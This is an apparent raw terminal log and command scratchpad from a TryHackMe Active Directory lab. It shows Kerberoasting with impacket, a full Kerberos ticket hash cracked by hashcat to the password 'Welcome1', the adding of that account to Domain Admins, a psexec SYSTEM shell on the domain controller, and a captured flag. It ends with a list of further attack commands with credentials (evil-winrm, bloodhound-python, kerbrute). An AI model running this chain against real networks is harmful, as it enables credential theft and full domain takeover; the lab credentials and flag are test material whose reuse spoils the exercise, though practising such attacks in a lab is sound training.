[proxychains] DLL init: proxychains-ng 4.17
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.200.150.10:389  ...  OK
ServicePrincipalName    Name        MemberOf  PasswordLastSet             LastLogon                   Delegation 
----------------------  ----------  --------  --------------------------  --------------------------  ----------
HTTP/csm.tryhackme.loc  j.phillips            2025-04-17 19:07:31.644827  2025-04-18 11:39:51.776438             



[-] CCache file is not found. Skipping...
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  TRYHACKME.LOC:88  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  TRYHACKME.LOC:88  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  TRYHACKME.LOC:88  ...  OK
$krb5tgs$23$*j.phillips$TRYHACKME.LOC$tryhackme.loc/j.phillips*$cae688bbe754e76dbc01b3934b1581e5$ef4150cb3da787af1fc09aa1060852f2e82c4870d7d30e2b2c119d3ba112c952fcc7feb96fd0a15bfc260583768aab211d9e7a99d1c9c80bd23d9f82a53a987d6b1396fcee549f03619067635f97b55126d174411cff93727f82280e1207b9733b925ac1c60606bbf90d9e99c38a0ed0ff94378cb86225774be928817a7ac3362e140a795f356e103963b67151d2ccf646fb4c461884f6024f9ffe4363bf1dd79b742611ff648eb0721cff1d9324367082f5f3c01a25fc4ebb0f052b495bbf249b63143f2b05af9ffa2626c771b298bc57392a93e2a9e95df3085d4e9c591522b4aab32b1ae9b6b8670e95c79d970cb5f91643a60f1dc7782ac2a735ddf0a95d08a43690c52345a7e0cf97c93247146a159301807903b0224b01d45d116550f54444622e7fceba2f00dfc3ef9de65c132497ee0944be7276f88c650216dd33037013191eee29a7e16afa97ee7c5f79400dc8d49b42df5d5c5f194060abe7954651e509be6bad35a4eed728867d2d126fbdc6586b5e3fcff05680104729b0c62642bb499a169ccc6e326f057aa991f1455770162405206550363a0e9e582fbd38a60e7a32134a50a3632c4755abbc76972c6914771819ca5d5951a663b5eda80b285a34725b6cb3b3f253269ab2d79a7d771b457af27de06bf77c9214138ddaa144560810f9709a2b02790156f7f959135e78812b3f6942c60bead154c5b1a3dbcc64a9a398f42c6e6b993e630eb852d573222a7fba71956be9e7a4de29b7bde39827714910359443b582c93c5d1d9110b5b2e26ca550e4b4043e4a25dba5749b85a7429800159442fd7f79804ce329623449965fdf0ece0278c5195c359e927e199981caf018701ab9a74abda0e82e9712751b26787b15e18e00e16590ae6cdb918dac617414f2f83e294508c915a7958d14ced15cbe058fb6e2712b53c17ada37e4300f8121fd220f28015cbf9145273bd296ba351dc668c28e62701fe3eb44373708a1646461b2ab873465b0e7d5b0cb9c5d8966eb28310734c1839def0023fb4c04193c2381baaca72ddddb40bd43b446552618c0d158ef807f8b14df7ebc53f7529230e85f4460b9250eb914ebbbe2024436308545b7baa5c456ec6dce51e92d0d54bcc88de6ebbbe95951ffea966b0c44b8ac0f2954c60acef01f7759d3b669efddb3e987af7de933c82157af8eebf52cf2c54ed1c08dee500f644dac2245460df94004f0b40ea1f342571e9ba6c162d9e8d3f1652689debe1383abb6ed008da7b9ab5085c35ae40114cae092ac51810ab1ba5fc3900b4fea178308d2be467a0a87e92f47





hashcat -m 13100 -a 0 hashjphillis.txt /usr/share/wordlists/rockyou.txt 
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #1: cpu-sandybridge-Intel(R) Core(TM) i7-8565U CPU @ 1.80GHz, 1435/2934 MB (512 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 0 MB

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 1 sec

$krb5tgs$23$*j.phillips$TRYHACKME.LOC$tryhackme.loc/j.phillips*$cae688bbe754e76dbc01b3934b1581e5$ef4150cb3da787af1fc09aa1060852f2e82c4870d7d30e2b2c119d3ba112c952fcc7feb96fd0a15bfc260583768aab211d9e7a99d1c9c80bd23d9f82a53a987d6b1396fcee549f03619067635f97b55126d174411cff93727f82280e1207b9733b925ac1c60606bbf90d9e99c38a0ed0ff94378cb86225774be928817a7ac3362e140a795f356e103963b67151d2ccf646fb4c461884f6024f9ffe4363bf1dd79b742611ff648eb0721cff1d9324367082f5f3c01a25fc4ebb0f052b495bbf249b63143f2b05af9ffa2626c771b298bc57392a93e2a9e95df3085d4e9c591522b4aab32b1ae9b6b8670e95c79d970cb5f91643a60f1dc7782ac2a735ddf0a95d08a43690c52345a7e0cf97c93247146a159301807903b0224b01d45d116550f54444622e7fceba2f00dfc3ef9de65c132497ee0944be7276f88c650216dd33037013191eee29a7e16afa97ee7c5f79400dc8d49b42df5d5c5f194060abe7954651e509be6bad35a4eed728867d2d126fbdc6586b5e3fcff05680104729b0c62642bb499a169ccc6e326f057aa991f1455770162405206550363a0e9e582fbd38a60e7a32134a50a3632c4755abbc76972c6914771819ca5d5951a663b5eda80b285a34725b6cb3b3f253269ab2d79a7d771b457af27de06bf77c9214138ddaa144560810f9709a2b02790156f7f959135e78812b3f6942c60bead154c5b1a3dbcc64a9a398f42c6e6b993e630eb852d573222a7fba71956be9e7a4de29b7bde39827714910359443b582c93c5d1d9110b5b2e26ca550e4b4043e4a25dba5749b85a7429800159442fd7f79804ce329623449965fdf0ece0278c5195c359e927e199981caf018701ab9a74abda0e82e9712751b26787b15e18e00e16590ae6cdb918dac617414f2f83e294508c915a7958d14ced15cbe058fb6e2712b53c17ada37e4300f8121fd220f28015cbf9145273bd296ba351dc668c28e62701fe3eb44373708a1646461b2ab873465b0e7d5b0cb9c5d8966eb28310734c1839def0023fb4c04193c2381baaca72ddddb40bd43b446552618c0d158ef807f8b14df7ebc53f7529230e85f4460b9250eb914ebbbe2024436308545b7baa5c456ec6dce51e92d0d54bcc88de6ebbbe95951ffea966b0c44b8ac0f2954c60acef01f7759d3b669efddb3e987af7de933c82157af8eebf52cf2c54ed1c08dee500f644dac2245460df94004f0b40ea1f342571e9ba6c162d9e8d3f1652689debe1383abb6ed008da7b9ab5085c35ae40114cae092ac51810ab1ba5fc3900b4fea178308d2be467a0a87e92f47:Welcome1


j.phillips:Welcome1













┌──(kali㉿kali)-[~/Downloads/ker]
└─$ proxychains net rpc group addmem "Domain Admins" j.phillips -U 'dc.tryhackme.loc/j.phillips%Welcome1' -S 10.200.150.10
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.200.150.10:445  ...  OK
                                                                                                                                                                                                                                                            
                                                                          
┌──(kali㉿kali)-[~/Downloads/ker]
└─$ proxychains impacket-psexec tryhackme.loc/j.phillips:'Welcome1'@10.200.150.10

[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.200.150.10:445  ...  OK
[*] Requesting shares on 10.200.150.10.....
[*] Found writable share ADMIN$
[*] Uploading file hJQAkWLh.exe
[*] Opening SVCManager on 10.200.150.10.....
[*] Creating service UfmL on 10.200.150.10.....
[*] Starting service UfmL.....
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.200.150.10:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.200.150.10:445  ...  OK
[!] Press help for extra shell commands
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.200.150.10:445  ...  OK
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> 








:\Windows\system32> cd /
 
C:\> dir
 Volume in drive C has no label.
 Volume Serial Number is A8A4-C362

 Directory of C:\

11/14/2018  06:56 AM    <DIR>          EFI
08/16/2025  04:50 PM                45 flag.txt
05/13/2020  05:58 PM    <DIR>          PerfLogs
11/14/2018  04:10 PM    <DIR>          Program Files
03/11/2021  07:29 AM    <DIR>          Program Files (x86)
04/16/2025  02:23 PM    <DIR>          Python313
03/17/2021  03:00 PM    <DIR>          Users
08/17/2025  07:34 AM    <DIR>          Windows
               1 File(s)             45 bytes
               7 Dir(s)  14,111,907,840 bytes free

C:\> type flag.txt
THM{dfc7764c-e62e-4811-a017-f65152266f47}







-===============================================================










└─$ proxychains smbclient \\\\10.200.150.10\\SYSVOL -U j.phillips%Welcome1




proxychains4  impacket-GetUserSPNs tryhackme.loc/j.phillips:Welcome1



 kerbrute userenum --dc tryhackme.loc -d tryhackme.loc userlist.txt         


ldapdomaindump -u 'tryhackme.loc\j.phillips' -p 'Welcome1!' 10.200.150.10 








proxychains4 impacket-psexec '10.200.150.10/j.phillips:Welcome1@10.200.150.10' 



proxychains evil-winrm -i 10.200.150.10 -u '10.200.150.10\j.phillips' -p 'Welcome1'


proxychains net rpc group addmem "Domain Admins" j.phillips \ -U 'dc.tryhackme.loc/j.phillips%Welcome1' \ -S 10.200.150.10

net group "Domain Admins" j.phillips /add /domain




proxychains4 evil-winrm -i 10.200.150.10 -u 'j.phillips' -p 'Welcome1'


proxychains net rpc group addmem "Domain Admins" j.phillips -U 'dc.tryhackme.loc/j.phillips%Welcome1' -S 10.200.150.10




proxychains4 bloodhound-python -u 'john' -p 'VerySafePassword!' -d tryhackme.loc -ns 10.200.150.10 -c All --zip



proxychains4 impacket-psexec '10.200.150.10/John:VerySafePassword!@10.200.150.10' 



evil-winrm -i 10.200.150.10 -u John -p VerySafePassword!


ldapdomain -u 

